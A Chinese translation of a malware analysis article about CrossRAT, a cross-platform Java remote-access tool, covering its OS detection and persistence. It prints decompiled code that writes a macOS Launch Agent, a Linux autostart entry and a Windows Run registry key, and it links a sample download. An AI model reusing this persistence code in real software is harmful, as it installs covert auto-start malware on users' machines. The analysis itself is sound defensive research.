@@ -1,0 +1,456 @@
+# 分析一款全球网络间谍活动中的跨平台恶意软件-CrossRAT（上）
+
+阅读量 **170231**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-01-29 14:59:40
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章原作者 objective-see，文章来源：objective-see.com
+
+原文地址：<https://objective-see.com/blog/blog_0x28.html>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p3.ssl.qhimg.com/t01da8d97ced3eeb223.jpg)
+
+## 写在前面的话
+
+在这篇文章中，我们将跟大家介绍一款名叫CrossRAT的跨平台恶意软件，该工具可以针对Windows、macOS以及Linux这三大操作系统实施攻击。我之前曾参加了ShmooCon大会，当时已经有研究人员在大会上介绍了这款恶意软件，但是他们并没有提供CrossRAT的详细技术细节。
+
+![](https://p4.ssl.qhimg.com/t0112f22dc267ba037c.png)
+
+因为，在这篇文章中我们将跟大家详细分析CrossRAT，其中将涉及到CrossRAT的持续感染机制以及攻击能力。在此我需要感谢一下Cooper
+([@cooperq](https://twitter.com/cooperq))，不仅是因为他给我提供了一份CrossRAT样本，而且他还把自己对CrossRAT的研究报告给我了，十分感谢。
+
+## CrossRAT
+
+CrossRAT样本下载：【[点我下载](https://objective-see.com/downloads/malware/CrossRAT.zip)】–密码：infect3d
+
+之前的CrossRAT研究报告：【[点我获取](https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf)】
+
+在之前的CrossRAT研究报告中，研究人员将CrossRAT描述为“一种新发现的桌面端网络间谍工具，该工具可以对Windows、macOS以及Linux平台实施攻击。”当然了，其中最能够激起我好奇心的就是它竟然能够攻击macOS，所以本文的分析重心可能会偏向macOS平台多一点。
+
+报告中给出的CrossRAT简单介绍如下：
+
+>
+> “该工具采用Java编程语言进行开发，可攻击Windows、Linux和macOS三大操作系统。CrossRAT能够修改目标主机的文件系统，进行屏幕截图，在Windows平台中运行任意DLL文件以实现二级感染，并能够在目标系统中实现持久化感染。”
+
+研究人员已经将一份样本（hmar6.jar）提交到了VirusTotal，点击【[这里](https://www.virustotal.com/#/file/15af5bbf3c8d5e5db41fd7c3d722e8b247b40f2da747d5c334f7fd80b715a649/detection)】获取。当然了，现在大多数的安全防护产品还无法检测到这种威胁。
+
+就编程语言来说，我个人是不太喜欢Java的，因为它是可以被“反编译”的，因此采用Java语言开发的恶意软件相对来说分析起来还算是比较方便。比如说jad或者JD-GUI都能够以编译后的jar文件作为输入，并输出可读性较高的Java代码。而且现在已经2018年了，所以你甚至可以在云端直接反编译Java代码。
+
+打开恶意.jar文件（hmar6.jar）之后，JD-GUI给我们显示了下列数据包layout：
+
+![](https://p1.ssl.qhimg.com/t010736a04fcea973a8.png)
+
+由于.jar文件是一种文档格式，我们也可以直接解压它，然后手动浏览数据包结构。当然了，文档中的文件都是一些Java类，其中包含了Java字节码。因此，我们才需要使用刚才提到的Java反编译工具。
+
+在这篇文章中，我们的目标是为了识别并理解这款恶意软件的：
+
+1. 持久化感染机制以及安装位置；
+
+2. C&C通信机制；
+
+3. 功能/能力；
+
+除此之外，我们还将给大家分析crossrat包中的client.class文件，因为这份文件中包含了恶意软件的主入口点（）以及crossrat的主要实现逻辑。但是，我们首先来看一看jar文件中的其他数据包：‘a’,
+‘b’和‘org’。
+
+第一个数据包（JD-GUI中的名字为‘a’），目测它负责判断当前运行的目标系统的操作系统版本。由于Java可以在多种平台上运行，CrossRAT可以在Windows、Linux、SunOS以及macOS平台上运行（假设都安装了Java）。当然了，并不是CrossRAT所有的功能都需要区分操作系统。比如说，持续性感染机制就是跟操作系统挂钩的，所以它才需要准确地识别目标底层的操作系统。不仅如此，操作系统的信息对于攻击者来说也是非常重要的。
+
+从a/c.class文件中导出的字符串也表明了CrossRAT所支持运行的系统平台：
+
+    
+    
+      $ strings - CrossRAT/a/c.class
+    
+        LINUX
+    
+        MACOS
+    
+        SOLARIS
+    
+       WINDOWS
+
+Java本身也提供了很多方法来检测操作系统平台。比如说，CrossRAT就调用了下列方法：
+
+    
+    
+      System.getProperty("os.name")
+
+这个方法将会返回例如“windows”、“linux”或“mac os”等值。
+
+有趣的是，这款恶意软件还包含了各种适用于不同操作系统平台的代码，这样可以帮助攻击者更加精确地检测目标操作系统。比如说，a/c/a.class中的代码将会执行/usr/bin/sw_vers：
+
+    
+    
+     Object localObject = new File("/usr/bin/sw_vers");
+    
+       ...
+    
+     
+    
+       Iterator localIterator = (localObject = e.a((File)localObject)).iterator();
+    
+       while (localIterator.hasNext()) {
+    
+          if ((localObject = (String)localIterator.next()).contains(c.b.a())) {
+    
+              return true;
+    
+          }
+    
+       }
+    
+      
+    
+       if (paramBoolean) {
+    
+          return ((localObject = System.getProperty("os.name").toLowerCase()).contains("mac os x"))
+    
+                 || (((String)localObject).contains("macos"));
+    
+       }
+    
+       ...
+
+sw-vers代码是专门针对苹果系统的，它客户以返回OSX/macOS的额外信息：
+
+    
+    
+    $ /usr/bin/sw_vers
+    
+        ProductName:  Mac OS X
+    
+        ProductVersion: 10.13.2
+    
+    BuildVersion: 17C88
+
+CrossRAT还包含了很多用于收集受感染系统信息的代码。比如说在crossrat/e.class文件中，我们可以看到代码会调用uname（使用了-a参数）：
+
+    
+    
+    public static String c()
+    
+      {
+    
+            String s = null;
+    
+            Object obj = Runtime.getRuntime().exec(new String[] {"uname", "-a"});
+    
+            s = ((BufferedReader) (obj = new BufferedReader(new InputStreamReader(((Process)
+    
+                 (obj)).getInputStream())))).readLine();
+    
+            ((BufferedReader) (obj)).close();
+    
+           
+    
+            return s;
+    
+      }
+
+uname命令在配合-a参数执行时，将不仅会显示出操作系统版本信息，而且还会显示出内核架构等信息（例如x86_64）。
+
+最后，CrossRAT还会尝试查询systemd文件以获取Linux平台相关的版本信息：
+
+    
+    
+    try
+    
+      {
+    
+          obj1 = a(new File("/etc/os-release"), "=");
+    
+      }
+    
+      catch(Exception _ex)
+    
+      {
+    
+          System.out.println("Failed to load /etc/os-release");
+    
+      }
+    
+      try
+    
+      {
+    
+          map = a(new File("/etc/lsb-release"), "=");
+    
+      }
+    
+      catch(Exception _ex)
+    
+      {
+    
+          System.out.println("Failed to load /etc/lsb-release");
+    
+      }
+
+运行了strings命令之后，我们还可以看到CrossRAT所能检测的操作系统版本其实是非常非常多的（或者说是可感染的平台）：
+
+    
+    
+    $ strings - a/b/c.class
+    
+     
+    
+    Alpine Linux Antergos Arch Linux Blag Centos Chakra Chapeau Crunchbang Crux Centos Chakra Chapeau Crunchbang Crux Debian Deepin Dragora Debian Debian Kali Linux Deepin Dragora Elementary_os Evolve_os Evolve Os Evolveos Fedora Frugalware Funtoo Fedora Frugalware Funtoo Gentoo Gnewsense Gentoo Jiyuu Jiyuu Kali Kaos Kde Neon Kde_neon Korora Kaos Kali Kali Linux Korora Lmde Lunar La/b/c; Linux Mint Linuxdeepin Linuxmint Lunar Lunar Linux Mageia Mandrake Mandriva Manjaro Mint Mageia Mandrake Mandriva Mandriva Linux Manjaro Manjaro Linux Nixos Nixos Opensuse Oracle_linux Oracle Linux Parabola Peppermint Parabola Parabola Gnu/linux-libre Peppermint Qubes Qubes Raspbian Redhat_enterprise Raspbian Red Hat Redhatenterprise Redhat Enterprise Sabayon Scientificlinux Slackware Solusos Steamos Suse Linux Sabayon Scientific Linux Slackware Solusos Stackmaptable Steamos Tinycore Trisquel Ubuntu Unknown Ubuntu Unknown Unknown Linux Viperr
+
+接下来，我们一起看一看下一个数据包，JD-GUI将其命名为了’b’:
+
+想知道这个数据包是干嘛用的吗？没错，它是用来实现持久化感染的。
+
+在受感染的系统中，为了确保操作系统在重启之后能够自动执行（或重新运行）恶意软件，CrossRAT需要实现持久化感染，这个功能就要求它带有针对不同操作系统所设计的代码了。也就是说，CrossRAT中包含了针对Windows、macOS以及Linux平台的持久化感染代码。
+
+b/c.class中实现了针对macOS的持久化代码，它主要利用的是一个Launch Agent。其中，’a’方法会调用’b’方法：
+
+    
+    
+      public final void a()
+    
+      {
+    
+          if(!b().exists())
+    
+                b().mkdirs();
+    
+     
+    
+          ...
+
+在对’b’方法分析之后，我们可以发现它返回了一个Launch Agent目录。如果用户是root用户，那么它将会返回系统Launch
+Agent目录（例如/Library/LaunchAgents/），否则它将会返回特定用户的工作目录（例如/Users/patrick/Library/LaunchAgents/）。
+
+    
+    
+    private static File b()
+    
+      {
+    
+            String s = System.getProperty("user.home");
+    
+            if(a.c.b().a() != a.c.a && (new BufferedReader(new InputStreamReader(
+    
+            Runtime.getRuntime().exec("whoami").getInputStream()))).readLine().equals("root"))
+    
+            {
+    
+                s = "";
+    
+            }
+    
+            return new File((new StringBuilder(String.valueOf(s))).append("/Library/LaunchAgents/")
+    
+                            .toString());
+    
+      }
+
+接下来，代码将会常见一个Launch Agent属性列表（plist）：
+
+    
+    
+     ((PrintWriter) (obj = new PrintWriter(new FileWriter(((File) (obj))))))
+    
+                     .println("<plist version="1.0">");
+    
+      ((PrintWriter) (obj)).println("<dict>");
+    
+      ((PrintWriter) (obj)).println("t<key>Label</key>");
+    
+      ((PrintWriter) (obj)).println((new StringBuilder("t<string>"))
+    
+                     .append(super.b).append("</string>").toString());
+    
+      ((PrintWriter) (obj)).println("t<key>ProgramArguments</key>");
+    
+      ((PrintWriter) (obj)).println("t<array>");
+    
+      if(a)
+    
+      {
+    
+          ((PrintWriter) (obj)).println("tt<string>java</string>");
+    
+          ((PrintWriter) (obj)).println("tt<string>-jar</string>");
+    
+      }
+    
+      ((PrintWriter) (obj)).println((new StringBuilder("tt<string>"))
+    
+                     .append(super.c).append("</string>").toString());
+    
+      ((PrintWriter) (obj)).println("t</array>");
+    
+      ((PrintWriter) (obj)).println("t<key>RunAtLoad</key>");
+    
+      ((PrintWriter) (obj)).println("t<true/>");
+    
+      ((PrintWriter) (obj)).println("</dict>");
+    
+      ((PrintWriter) (obj)).println("</plist>");
+    
+      ((PrintWriter) (obj)).close();
+
+由于RunAtLoad键被设置成了True，所以恶意软件在ProgramArguments数组中指定的内容都将得到执行。代码中显示的是：java -jar
+[super.c]，它决定了哪一个.jar文件需要持久化执行（例如super.c）。我们可以分析反编译后的Java代码，或者直接运行恶意软件，并导出plist文件。我们这里选择使用第二种方法，
+并感染了一台macOS虚拟机：
+
+    
+    
+    $ java -jar hmar6.jar &
+    
+     
+    
+      $ cat ~/Library/LaunchAgents/mediamgrs.plist
+    
+        <plist version="1.0">
+    
+        <dict>
+    
+          <key>Label</key>
+    
+          <string>mediamgrs</string>
+    
+          <key>ProgramArguments</key>
+    
+          <array>
+    
+            <string>java</string>
+    
+            <string>-jar</string>
+    
+            <string>/Users/user/Library/mediamgrs.jar</string>
+    
+          </array>
+    
+          <key>RunAtLoad</key>
+    
+          <true/>
+    
+        </dict>
+    
+    </plist>
+
+除此之外，~/Library/mediamgrs.jar也是持续性感染的。如果我们计算mediamgrs.jar和hmar6.jar文件的哈希值的话，你就会发现它们两个是完全相同的：
+
+    
+    
+    $ md5 ~/Library/mediamgrs.jar
+    
+      MD5 (/Users/user/Library/mediamgrs.jar) = 85b794e080d83a91e904b97769e1e770
+    
+     
+    
+      $ md5 hmar6.jar
+    
+      MD5 (/Users/user/Desktop/hmar6.jar) = 85b794e080d83a91e904b97769e1e770
+
+接下来，我们就可以弄清楚CrossRAT是如何在Linux或Windows平台上实现持久化感染的了。
+
+Linux持久化感染是在b/d.class中实现的：
+
+大家可以从上面这种截图中看到，CrossRAT会在Linux系统中创建一个autostart文件（目录为~/.config/autostart/，文件名为mediamgrs.desktop）。跟macOS类似，它也会自己实现持久化感染：Exec=java
+-jar [this.c]。除此之外，我们也可以看到’this.c’的值被设置成了：/usr/var/mediamgrs.jar。
+
+    
+    
+    else
+    
+      {
+    
+          k.K = "/usr/var/";
+    
+      }
+    
+     
+    
+      paramArrayOfString = new File(k.K + "mediamgrs.jar");
+
+当然了，CrossRAT中还包含了Windows平台的持久化感染逻辑。这些持久化感染代码可以在b/e.class中找到：
+
+    
+    
+    public final void a()
+    
+      {
+    
+          String s;
+    
+          if(a)
+    
+          {
+    
+              s = (new StringBuilder(String.valueOf(System.getProperty("java.home"))))
+    
+              .append("\bin\javaw.exe").toString();
+    
+     
+    
+              s = (new StringBuilder(String.valueOf(s))).append(" -jar "")
+    
+              .append(c).append(""").toString();
+    
+          } else
+    
+          {
+    
+              s = super.c;
+    
+          }
+    
+          Runtime.getRuntime().exec(new String[] {
+    
+              "reg", "add", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\",
+    
+                            "/v", super.b, "/t", "REG_SZ", "/d", s, "/f"
+    
+          });
+    
+      }
+
+这里使用的还是之前的CurrentVersionRun注册表键，这是一种相对比较老的Windows持久化感染技术了，但是它能够确保受感染的Windows系统重启之后都能够重新运行恶意软件的.jar文件。
+
+![](https://p4.ssl.qhimg.com/t01bcfd66f0be25788b.png)
+
+## 总结
+
+在本系列文章中的上集，我们给大家简单介绍了CrossRAT中’a’数据包（操作系统检测）以及‘b’数据包（持久化感染）的功能。接下来，我们将跟大家介绍CrossRAT中剩下的数据包功能以及恶意软件的核心逻辑，感兴趣的同学请持续关注安全客的最新更新。
+
+本文翻译自objective-see.com [原文链接](https://objective-see.com/blog/blog_0x28.html)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **WisFree** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/96323](/post/id/96323)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [objective-see.com](https://objective-see.com/blog/blog_0x28.html)
+
+如若转载,请注明出处： <https://objective-see.com/blog/blog_0x28.html>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [恶意软件](/tag/恶意软件)
+  * [macOS](/tag/macOS)
+  * [CrossRAT](/tag/CrossRAT)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p5.ssl.qhimg.com/t014c3fa13dce6c85dd.png) WisFree
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
